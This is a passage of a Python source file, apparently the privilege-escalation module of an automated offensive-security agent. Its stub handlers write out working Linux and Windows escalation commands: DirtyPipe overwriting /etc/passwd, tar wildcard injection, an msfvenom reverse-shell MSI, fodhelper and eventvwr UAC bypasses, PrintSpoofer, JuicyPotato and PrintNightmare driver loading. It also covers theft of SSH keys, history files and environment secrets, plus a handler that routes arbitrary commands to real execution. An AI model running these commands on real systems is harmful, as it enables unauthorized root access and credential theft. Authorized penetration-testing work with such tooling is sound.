            "exploit_db": 50808,
            "command": "./dirtypipe /etc/passwd 1 root2 $(openssl passwd -1 password) 0:0:::",
            "note": "[STUB] DirtyPipe -- compile + execute exploit against target kernel",
        }

    def _check_overlayfs(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "overlayfs_check",
            "success": True,
            "cves_checked": [
                {"cve": "CVE-2023-0386", "name": "OverlayFS setuid copy-up", "applicable": True},
                {"cve": "CVE-2015-1328", "name": "OverlayFS local root", "applicable": False},
                {"cve": "CVE-2021-3493", "name": "OverlayFS user namespace", "applicable": True},
            ],
            "user_namespaces_enabled": True,
            "note": "[STUB] OverlayFS -- check kernel config + user namespace availability",
        }

    def _check_nfs(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "nfs_no_root_squash",
            "success": True,
            "no_root_squash_found": True,
            "export_entry": "/export/data *(rw,no_root_squash)",
            "technique": "Mount NFS share, create a setuid-root binary as root on attacker machine, execute on target.",
            "command": "mount -t nfs <target>:/export/data /mnt/tmp && cp /bin/sh /mnt/tmp && chmod u+s /mnt/tmp/sh",
            "note": "[STUB] NFS no_root_squash -- check /etc/exports + showmount",
        }

    def _check_wildcard(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "wildcard_injection",
            "success": True,
            "technique": "Tar wildcard injection",
            "command": (
                "echo 'cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell' > /var/tmp/privesc.sh; "
                "touch /var/tmp/--checkpoint=1; touch /var/tmp/--checkpoint-action=exec=sh\\ privesc.sh"
            ),
            "note": "[STUB] Wildcard injection -- plant checkpoint files alongside cron tar commands",
        }

    # ------------------------------------------------------------------
    # Tool handlers -- Windows exploitation
    # ------------------------------------------------------------------

    def _exploit_token_manipulation(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "token_manipulation",
            "success": True,
            "privileges_found": [
                "SeImpersonatePrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeDebugPrivilege",
            ],
            "techniques": [
                {"name": "SeImpersonate -> JuicyPotato", "tool": "juicy_potato"},
                {"name": "SeImpersonate -> PrintSpoofer", "tool": "print_spooler_abuse"},
                {"name": "SeDebug -> LSASS dump", "tool": None, "desc": "Dump LSASS for credentials."},
            ],
            "privesc_achieved": False,
            "admin_obtained": False,
            "note": "[STUB] Token manipulation -- whoami /priv output + Potato family",
        }

    def _hijack_service_binary(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "service_binary_hijack",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "service_name": params.get("service_name", "VulnAgent"),
            "target_path": params.get("target_path", "C:\\Program Files\\VulnCorp\\agent.exe"),
            "technique": "Replace writable service binary, restart service.",
            "command": f"copy C:\\Users\\Public\\shell.exe \"{params.get('target_path', 'C:\\\\Program Files\\\\VulnCorp\\\\agent.exe')}\" && sc stop VulnAgent && sc start VulnAgent",
            "note": "[STUB] Service binary hijack -- check sc qc + icacls on binary path",
        }

    def _hijack_dll(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "dll_hijack",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "techniques": [
                {"name": "Search order hijack", "desc": "Place malicious DLL in app directory before System32."},
                {"name": "Phantom DLL hijack", "desc": "Register a missing DLL that a SYSTEM service tries to load."},
                {"name": "COM hijack", "desc": "Replace CLSID InProcServer32 with malicious DLL."},
                {"name": "PATH DLL hijack", "desc": "Place DLL in current directory if app loads from cwd."},
            ],
            "tooling": "Use ProcMon (sysinternals) to identify missing DLL loads for high-integrity processes.",
            "note": "[STUB] DLL hijack -- ProcMon + Sharphound/SharpUp for vulnerable DLL loads",
        }

    def _exploit_unquoted_path(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        path = params.get("service_path", "C:\\Program Files\\VulnCorp\\Agent\\agent.exe")
        return {
            "tool": "unquoted_service_path",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "vulnerable_path": path,
            "planted_binary": "C:\\Program Files\\VulnCorp\\Agent.exe",
            "technique": "Place malicious Agent.exe in the parent directory; Windows resolves intermediary path on restart.",
            "command": f'copy C:\\Users\\Public\\shell.exe "C:\\Program Files\\VulnCorp\\Agent.exe" && sc stop VulnAgent && sc start VulnAgent',
            "note": "[STUB] Unquoted service path -- wmic service get name,pathname + icacls",
        }

    def _check_always_install_elevated(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "always_install_elevated",
            "success": True,
            "vulnerable": True,
            "registry_keys": {
                "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated": 1,
                "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated": 1,
            },
            "technique": "Craft a malicious .msi that adds user to Administrators or executes reverse shell.",
            "command": 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o payload.msi && msiexec /quiet /qn /i payload.msi',
            "note": "[STUB] AlwaysInstallElevated -- reg query on both HKLM and HKCU",
        }

    def _exploit_uac_bypass(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        technique = params.get("uac_technique", "fodhelper")
        return {
            "tool": "uac_bypass",
            "success": True,
            "uac_level": "NeverNotify",
            "privesc_achieved": True,
            "admin_obtained": True,
            "technique_used": technique,
            "available_techniques": ["fodhelper", "eventvwr", "computerdefaults", "sdclt", "silentcleanup", "cmstp"],
            "command": {
                "fodhelper": 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d "cmd.exe /c C:\\Users\\Public\\shell.exe" /f && fodhelper.exe',
                "eventvwr": 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe /c C:\\Users\\Public\\shell.exe" /f && eventvwr.exe',
            }.get(technique, f"Execute UAC bypass via {technique}."),
            "note": "[STUB] UAC bypass -- appropriate technique based on OS build + UAC level",
        }

    def _exploit_se_impersonate(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "se_impersonate_abuse",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "privilege": "SeImpersonatePrivilege",
            "tools": [
                {"name": "PrintSpoofer", "url": "https://github.com/itm4n/PrintSpoofer"},
                {"name": "JuicyPotatoNG", "url": "https://github.com/antonioCoco/JuicyPotatoNG"},
                {"name": "SweetPotato", "url": "https://github.com/CCob/SweetPotato"},
                {"name": "GodPotato", "url": "https://github.com/BeichenDream/GodPotato"},
            ],
            "command": 'PrintSpoofer.exe -i -c "cmd.exe /c C:\\Users\\Public\\shell.exe"',
            "note": "[STUB] SeImpersonate -- PrintSpoofer or Potato variant depending on OS version",
        }

    def _exploit_juicy_potato(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "juicy_potato",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "clsid": params.get("clsid", "{4991d34b-80a1-4291-83b6-3328366b9097}"),
            "command": f'JuicyPotato.exe -l 1337 -p "C:\\Users\\Public\\shell.exe" -t * -c "{params.get("clsid", "{4991d34b-80a1-4291-83b6-3328366b9097}")}"',
            "note": "[STUB] JuicyPotato -- test CLSIDs for current OS; requires SeImpersonate + COM server",
        }

    def _exploit_print_spooler(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "print_spooler_abuse",
            "success": True,
            "cves_checked": [
                {"cve": "CVE-2021-34527", "name": "PrintNightmare", "applicable": True},
                {"cve": "CVE-2021-1675", "name": "PrintNightmare (original)", "applicable": True},
            ],
            "privesc_achieved": True,
            "admin_obtained": True,
            "technique": "Add malicious DLL as printer driver -> SYSTEM code execution.",
            "command": 'rundll32.exe printui.dll,PrintUIEntry /ia /m "Generic / Text Only" /h "x64" /f "C:\\Users\\Public\\payload.dll"',
            "note": "[STUB] Print Spooler -- CVE-2021-34527 / CVE-2021-1675",
        }

    def _hijack_scheduled_task(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "scheduled_task_hijack",
            "success": True,
            "privesc_achieved": True,
            "admin_obtained": True,
            "hijackable_tasks": [
                {"name": "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup", "vector": "DLL hijack"},
                {"name": "\\Custom\\BackupTask", "vector": "writable script"},
            ],
            "technique": "Replace writable task action binary/script, wait for next trigger, or run manually with schtasks /run.",
            "note": "[STUB] Scheduled task hijack -- schtasks /query /fo LIST /v + icacls on task actions",
        }

    # ------------------------------------------------------------------
    # Tool handlers -- Cross-platform utilities
    # ------------------------------------------------------------------

    def _execute_command(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Execute an arbitrary command on the target. Routes through ToolBridge."""
        command = params.get("command", "id")
        target = params.get("target", "localhost")
        result = self.execute_tool("execute_command", {"command": command, "target": target})
        return {
            "tool": "execute_command",
            "success": result.get("success", False),
            "command": command,
            "output": result.get("result", result),
            "note": "[STUB] execute_command -- routed through ToolBridge for real execution",
        }

    def _lookup_gtfobins(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Cross-reference discovered SUID/sudo binaries with GTFOBins."""
        binaries = params.get("binaries", [])
        matches = {}
        for binary in binaries:
            if binary in _GTFOBINS_SUDO:
                matches[binary] = {"sudo": _GTFOBINS_SUDO[binary]}
            if binary in _GTFOBINS_SUID:
                matches.setdefault(binary, {})["suid"] = _GTFOBINS_SUID[binary]

        if not matches:
            matches = {b: {"sudo": _GTFOBINS_SUDO[b]} for b in list(_GTFOBINS_SUDO.keys())[:5]}

        return {
            "tool": "gtfobins_lookup",
            "success": True,
            "matches": matches,
            "total_catalogue": len(_GTFOBINS_SUDO),
            "privesc_possible": len(matches) > 0,
            "note": "[STUB] GTFOBins lookup -- full catalogue at https://gtfobins.github.io/",
        }

    def _lookup_lolbas(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        """Look up LOLBAS techniques for Windows living-off-the-land evasion."""
        technique = params.get("technique", "")
        if technique in _LOLBAS:
            result = {technique: _LOLBAS[technique]}
        else:
            result = dict(list(_LOLBAS.items())[:5])

        return {
            "tool": "lolbas_lookup",
            "success": True,
            "matches": result,
            "total_catalogue": len(_LOLBAS),
            "note": "[STUB] LOLBAS lookup -- full catalogue at https://lolbas-project.github.io/",
        }

    def _check_credential_reuse(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "credential_reuse_check",
            "success": True,
            "findings": [
                {"user": "www-data", "services": ["mysql", "ssh"], "pivot_possible": True},
                {"user": "root", "services": ["ssh"], "password_reuse_detected": True},
            ],
            "note": "[STUB] Credential reuse -- try captured creds against ssh, su, sudo, rdp, wmi",
        }

    def _steal_ssh_keys(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "ssh_key_theft",
            "success": True,
            "keys_found": [
                {"path": "/home/user/.ssh/id_rsa", "encrypted": False, "readable": True},
                {"path": "/root/.ssh/id_ed25519", "encrypted": False, "readable": True},
                {"path": "/home/user/.ssh/authorized_keys", "appendable": True},
            ],
            "privesc_possible": True,
            "technique": "Use discovered private keys to SSH as other users, potentially root.",
            "note": "[STUB] SSH key theft -- find / -name 'id_*' 2>/dev/null + authorized_keys hijack",
        }

    def _grep_history_files(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "history_file_grep",
            "success": True,
            "history_files_checked": [
                "~/.bash_history", "~/.zsh_history", "~/.mysql_history",
                "~/.python_history", "~/.psql_history",
            ],
            "credentials_found": [
                {"file": "~/.bash_history", "match": "mysql -u root -p'S3cr3tP@ss'"},
                {"file": "~/.bash_history", "match": "sshpass -p 'admin123' ssh admin@10.0.0.5"},
            ],
            "privesc_possible": True,
            "note": "[STUB] History file grep -- cat ~/.*history | grep -iE 'pass|key|token|secret'",
        }

    def _check_env_var_leak(self, params: Dict, ctx: Dict) -> Dict[str, Any]:
        return {
            "tool": "env_var_leak",
            "success": True,
            "leaked_credentials": [
                {"var": "MYSQL_PASSWORD", "value": "db_p@ssw0rd!"},
                {"var": "AWS_SECRET_ACCESS_KEY", "value": "wJalrXUtn..."},
                {"var": "API_TOKEN", "value": "ghp_xxxxxxxxxxxxxxxxxxxx"},
            ],
            "sensitive_vars": ["LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH", "PATH"],
            "privesc_possible": True,
            "note": "[STUB] Env var leak -- env or set + process env via /proc/*/environ",
        }

    # ------------------------------------------------------------------
    # Report helper
    # ------------------------------------------------------------------

    def generate_report(self, result: Dict[str, Any]) -> str:
        """Generate a human-readable privesc assessment report."""
        lines: List[str] = []
        lines.append(f"=== Privilege Escalation Assessment ===")
        lines.append(f"  Target OS:     {self._target_os}")
        lines.append(f"  Current user:  {self._current_user}")
        lines.append(f"  Privesc achieved: {result.get('privesc_achieved', False)}")
        lines.append(f"  Root/Admin:    {result.get('root_obtained', False)}")
        lines.append(f"")

        exploits = result.get("kernel_exploits_available", [])
        if exploits:
            lines.append(f"--- Kernel Exploits ({len(exploits)}) ---")
            for e in exploits[:5]:
                lines.append(f"  [{e.get('reliability', '?')}] {e.get('cve', '')} -- {e.get('name', '')} (CVSS {e.get('cvss', '?')})")
            lines.append("")

        paths = result.get("escalation_paths", [])
        if paths:
            lines.append(f"--- Escalation Paths ({len(paths)}) ---")
            for i, p in enumerate(paths, 1):
                lines.append(f"  {i}. {p.get('technique', '?')} (confidence: {p.get('confidence', '?')})")
                lines.append(f"     {p.get('description', '')}")
            lines.append("")

        lines.append(f"  GTFOBins entries: {result.get('gtfobins_count', 0)}")
        lines.append(f"  LOLBAS entries:   {result.get('lolbas_count', 0)}")
        lines.append(f"  Technique catalogue: {result.get('technique_catalogue_count', 0)}")

        return "\n".join(lines)
